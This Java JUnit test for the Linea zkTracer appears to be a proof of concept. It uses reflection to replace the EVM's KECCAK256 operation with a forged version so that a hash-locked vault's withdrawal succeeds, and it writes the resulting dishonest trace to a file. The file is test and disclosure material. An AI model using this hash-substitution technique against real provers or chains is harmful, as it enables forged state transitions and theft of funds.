package net.consensys.linea.testing;

import static org.assertj.core.api.Assertions.assertThat;
import static org.hyperledger.besu.evm.internal.Words.clampedToLong;

import java.lang.reflect.Field;
import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HexFormat;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;
import net.consensys.linea.reporting.TracerTestBase;
import net.consensys.linea.zktracer.ZkTracer;
import org.apache.tuweni.bytes.Bytes;
import org.apache.tuweni.bytes.Bytes32;
import org.hyperledger.besu.crypto.KeyPair;
import org.hyperledger.besu.crypto.SECP256K1;
import org.hyperledger.besu.crypto.SECPPrivateKey;
import org.hyperledger.besu.datatypes.Address;
import org.hyperledger.besu.datatypes.Hash;
import org.hyperledger.besu.datatypes.Wei;
import org.hyperledger.besu.ethereum.core.BlockHeader;
import org.hyperledger.besu.ethereum.core.BlockHeaderBuilder;
import org.hyperledger.besu.ethereum.core.Transaction;
import org.hyperledger.besu.ethereum.core.encoding.EncodingContext;
import org.hyperledger.besu.ethereum.core.encoding.TransactionEncoder;
import org.hyperledger.besu.ethereum.mainnet.ProtocolSpec;
import org.hyperledger.besu.ethereum.processing.TransactionProcessingResult;
import org.hyperledger.besu.ethereum.referencetests.GeneralStateTestCaseEipSpec;
import org.hyperledger.besu.ethereum.referencetests.ReferenceTestWorldState;
import org.hyperledger.besu.evm.EVM;
import org.hyperledger.besu.evm.account.Account;
import org.hyperledger.besu.evm.frame.ExceptionalHaltReason;
import org.hyperledger.besu.evm.frame.MessageFrame;
import org.hyperledger.besu.evm.gascalculator.GasCalculator;
import org.hyperledger.besu.evm.operation.Keccak256Operation;
import org.hyperledger.besu.evm.operation.Operation;
import org.hyperledger.besu.evm.operation.OperationRegistry;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInfo;

public class HashAuthorizationVaultTraceTest extends TracerTestBase {

  private static final Bytes A = Bytes.fromHexString("0x0101ff01");
  private static final Bytes B = Bytes.fromHexString("0x02000100");
  private static final Bytes32 HASH_B =
      Bytes32.fromHexString(
          "0x83081cbcb53fc5c0b60016577a5d45c54d0fee8b122a7c396b80c1827d7740af");

  private static final String VAULT_CREATION_BYTECODE =
      "60a06040526040516102033803806102038339810160408190526020916027565b608052603d565b5f602082840312156036575f5ffd5b5051919050565b6080516101a961005a5f395f818160520152608801526101a95ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80630968f2641461003857806355f2842a1461004d575b5f5ffd5b61004b6100463660046100f6565b610086565b005b6100747f000000000000000000000000000000000000000000000000000000000000000081565b60405190815260200160405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000082826040516100b7929190610164565b6040518091039020146100c8575f5ffd5b60405133904780156108fc02915f818181858888f193505050501580156100f1573d5f5f3e3d5ffd5b505050565b5f5f60208385031215610107575f5ffd5b823567ffffffffffffffff81111561011d575f5ffd5b8301601f8101851361012d575f5ffd5b803567ffffffffffffffff811115610143575f5ffd5b856020828401011115610154575f5ffd5b6020919091019590945092505050565b818382375f910190815291905056fea264697066735822122076347d3fa5196382af42efc059be9b3bd58d227551e20ea1cdcdb001a3d9bfc364736f6c63430008210033";

  private static final String WITHDRAW_CALLDATA =
      "0968f264"
          + "0000000000000000000000000000000000000000000000000000000000000020"
          + "0000000000000000000000000000000000000000000000000000000000000004"
          + "0101ff0100000000000000000000000000000000000000000000000000000000";

  private static KeyPair fixedKeyPair() {
    final SECP256K1 secp = new SECP256K1();
    final SECPPrivateKey privateKey =
        SECPPrivateKey.create(
            new BigInteger("1c0ffee123456789abcdef00112233445566778899aabbccddeeff0011223344", 16),
            SECP256K1.CURVE_NAME);
    return KeyPair.create(privateKey, secp.getCurve(), secp.getCurveName());
  }

  private static final class NonPrefixKeccak256Operation extends Keccak256Operation {
    private final AtomicInteger substitutionHits;

    NonPrefixKeccak256Operation(
        final GasCalculator gasCalculator, final AtomicInteger substitutionHits) {
      super(gasCalculator);
      this.substitutionHits = substitutionHits;
    }

    @Override
    public Operation.OperationResult execute(final MessageFrame frame, final EVM evm) {
      final long from = clampedToLong(frame.popStackItem());
      final long length = clampedToLong(frame.popStackItem());
      final long cost = gasCalculator().keccak256OperationGasCost(frame, from, length);
      if (frame.getRemainingGas() < cost) {
        return new Operation.OperationResult(cost, ExceptionalHaltReason.INSUFFICIENT_GAS);
      }

      final Bytes authenticatedMemoryBytes = frame.readMutableMemory(from, length);
      if (authenticatedMemoryBytes.equals(A)) {
        substitutionHits.incrementAndGet();
        frame.pushStackItem(HASH_B);
      } else {
        frame.pushStackItem(org.hyperledger.besu.crypto.Hash.keccak256(authenticatedMemoryBytes));
      }
      return new Operation.OperationResult(cost, null);
    }
  }

  private static final class RegistryPatch implements AutoCloseable {
    private final OperationRegistry registry;
    private final Operation original;

    private RegistryPatch(final OperationRegistry registry, final Operation original) {
      this.registry = registry;
      this.original = original;
    }

    static RegistryPatch install(
        final EVM evm, final AtomicInteger substitutionHits) throws ReflectiveOperationException {
      final Field operationsField = EVM.class.getDeclaredField("operations");
      operationsField.setAccessible(true);
      final OperationRegistry registry = (OperationRegistry) operationsField.get(evm);
      final Operation original = registry.get(0x20);
      assertThat(original).isInstanceOf(Keccak256Operation.class);
      registry.put(new NonPrefixKeccak256Operation(evm.getGasCalculator(), substitutionHits));
      return new RegistryPatch(registry, original);
    }

    @Override
    public void close() {
      registry.put(original);
    }
  }

  @Test
  void controlOrDishonestTraceProducesDeterministicStateDifferential(TestInfo testInfo)
      throws Exception {
    final boolean attack =
        Boolean.getBoolean("expect.attack") || "1".equals(System.getenv("NONPREFIX_ATTACK"));
    final KeyPair keyPair = fixedKeyPair();
    final Address attackerAddress = Address.extract(keyPair.getPublicKey());
    final Address vaultAddress = Address.contractAddress(attackerAddress, 0L);

    final Wei initialAttackerBalance = Wei.fromEth(10);
    final Wei vaultFunding = Wei.fromEth(1);

    final ToyAccount attacker =
        ToyAccount.builder()
            .balance(initialAttackerBalance)
            .nonce(0L)
            .address(attackerAddress)
            .keyPair(keyPair)
            .build();

    final Bytes initCode =
        Bytes.concatenate(Bytes.fromHexString("0x" + VAULT_CREATION_BYTECODE), HASH_B);

    final Transaction deploy =
        ToyTransaction.builder()
            .sender(attacker)
            .keyPair(keyPair)
            .nonce(0L)
            .payload(initCode)
            .value(vaultFunding)
            .gasPrice(Wei.ZERO)
            .gasLimit(2_000_000L)
            .build();

    final Transaction withdraw =
        ToyTransaction.builder()
            .sender(attacker)
            .keyPair(keyPair)
            .nonce(1L)
            .toAddress(vaultAddress)
            .payload(Bytes.fromHexString("0x" + WITHDRAW_CALLDATA))
            .value(Wei.ZERO)
            .gasPrice(Wei.ZERO)
            .gasLimit(500_000L)
            .build();

    final ToyExecutionEnvironmentV2 environment =
        ToyExecutionEnvironmentV2.builder(chainConfig, testInfo)
            .accounts(List.of(attacker))
            .transactions(List.of(deploy, withdraw))
            .build();

    final ProtocolSpec protocolSpec =
        ExecutionEnvironment.getProtocolSpec(chainConfig.id, chainConfig.fork);
    final GeneralStateTestCaseEipSpec ordinarySpec =
        environment.buildGeneralStateTestCaseSpec(protocolSpec);

    final BlockHeader zeroBaseFeeHeader =
        BlockHeaderBuilder.fromHeader(ordinarySpec.getBlockHeader())
            .baseFee(Wei.ZERO)
            .buildBlockHeader();

    final GeneralStateTestCaseEipSpec zeroFeeSpec =
        new GeneralStateTestCaseEipSpec(
            ordinarySpec.getFork(),
            List.of(() -> deploy, () -> withdraw),
            ordinarySpec.getInitialWorldState(),
            null,
            null,
            zeroBaseFeeHeader,
            -1,
            -1,
            -1,
            null);

    final ReferenceTestWorldState world = zeroFeeSpec.getInitialWorldState();
    ToyExecutionTools.addSystemAccountsIfRequired(world.updater());

    final Hash initialRoot = world.rootHash();
    final BigInteger initialAttacker = world.get(attackerAddress).getBalance().getAsBigInteger();
    final Bytes deployRlp =
        TransactionEncoder.encodeOpaqueBytes(deploy, EncodingContext.BLOCK_BODY);
    final Bytes withdrawRlp =
        TransactionEncoder.encodeOpaqueBytes(withdraw, EncodingContext.BLOCK_BODY);

    final List<Boolean> transactionSuccess = new ArrayList<>();
    final List<TransactionProcessingResult> processingResults = new ArrayList<>();
    final AtomicInteger substitutionHits = new AtomicInteger();
    final ZkTracer tracer =
        new ZkTracer(chainConfig, ToyExecutionEnvironmentV2.DEFAULT_BLOB_BASE_FEES);

    RegistryPatch registryPatch = null;
    try {
      if (attack) {
        registryPatch = RegistryPatch.install(protocolSpec.getEvm(), substitutionHits);
      }

      ToyExecutionTools.executeTest(
          zeroFeeSpec,
          protocolSpec,
          tracer,
          (transaction, result) -> {
            transactionSuccess.add(result.isSuccessful());
            processingResults.add(result);
          },
          ignored -> {},
          testInfo);
    } finally {
      if (registryPatch != null) {
        registryPatch.close();
      }
    }

    final Account finalAttackerAccount = world.get(attackerAddress);
    final Account finalVaultAccount = world.get(vaultAddress);
    final BigInteger finalAttacker = finalAttackerAccount.getBalance().getAsBigInteger();
    final BigInteger finalVault =
        finalVaultAccount == null
            ? BigInteger.ZERO
            : finalVaultAccount.getBalance().getAsBigInteger();
    final Hash finalRoot = world.rootHash();

    final Path tracePath =
        Path.of(
            System.getProperty(
                "trace.output",
                System.getenv().getOrDefault(
                    "NONPREFIX_TRACE_OUTPUT",
                    "build/nonprefixpoc/hash_authorization_vault_"
                        + (attack ? "attack" : "control")
                        + ".lt.gz")));
    if (tracePath.getParent() != null) {
      Files.createDirectories(tracePath.getParent());
    }
    tracer.writeToFile(tracePath, zeroBaseFeeHeader.getNumber(), zeroBaseFeeHeader.getNumber());
    final String traceSha256 =
        HexFormat.of()
            .formatHex(
                MessageDigest.getInstance("SHA-256").digest(Files.readAllBytes(tracePath)));

    System.out.printf("mode=%s%n", attack ? "ATTACK" : "CONTROL");
    System.out.printf("sourceKeccakInput=%s%n", A.toHexString());
    System.out.printf("substitutedKeccakPreimage=%s%n", B.toHexString());
    System.out.printf("reportedKeccakResult=%s%n", HASH_B.toHexString());
    System.out.printf("substitutionHits=%d%n", substitutionHits.get());
    System.out.printf("attacker=%s%n", attackerAddress);
    System.out.printf("vault=%s%n", vaultAddress);
    System.out.printf("deployRlp=%s%n", deployRlp.toHexString());
    System.out.printf("withdrawRlp=%s%n", withdrawRlp.toHexString());
    System.out.printf("initialStateRoot=%s%n", initialRoot);
    System.out.printf("finalStateRoot=%s%n", finalRoot);
    System.out.printf("initialAttackerBalance=%s%n", initialAttacker);
    System.out.printf("finalAttackerBalance=%s%n", finalAttacker);
    System.out.printf("finalVaultBalance=%s%n", finalVault);
    System.out.printf("transactionSuccess=%s%n", transactionSuccess);
    System.out.printf("deployLogs=%s%n", processingResults.get(0).getLogs());
    System.out.printf("withdrawLogs=%s%n", processingResults.get(1).getLogs());
    System.out.printf("withdrawResult=%s%n", processingResults.get(1));
    System.out.printf("tracePath=%s%n", tracePath.toAbsolutePath());
    System.out.printf("traceSha256=%s%n", traceSha256);

    assertThat(transactionSuccess).hasSize(2);
    assertThat(transactionSuccess.get(0)).as("deployment succeeds").isTrue();
    assertThat(processingResults.get(0).getLogs()).isEmpty();
    assertThat(processingResults.get(1).getLogs()).isEmpty();

    final BigInteger oneEth = vaultFunding.getAsBigInteger();
    if (attack) {
      assertThat(substitutionHits.get()).as("only withdraw(A) is substituted").isEqualTo(1);
      assertThat(transactionSuccess.get(1)).as("forged hash authorization succeeds").isTrue();
      assertThat(finalVault).isZero();
      assertThat(finalAttacker).isEqualTo(initialAttacker);
    } else {
      assertThat(substitutionHits.get()).isZero();
      assertThat(transactionSuccess.get(1)).as("honest hash authorization fails").isFalse();
      assertThat(finalVault).isEqualTo(oneEth);
      assertThat(finalAttacker).isEqualTo(initialAttacker.subtract(oneEth));
    }
  }
}
